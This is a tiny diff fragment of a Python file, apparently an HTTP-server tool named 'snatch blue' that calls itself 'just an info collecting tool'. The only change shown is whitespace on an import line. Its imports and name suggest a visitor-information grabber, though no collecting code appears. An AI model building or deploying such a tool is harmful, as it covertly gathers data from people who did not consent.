@@ -5,7 +5,7 @@
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback, requests, base64, httpagentparser 
 
 __app__ = "snatch blue"
 __description__ = "just an info collecting tool"
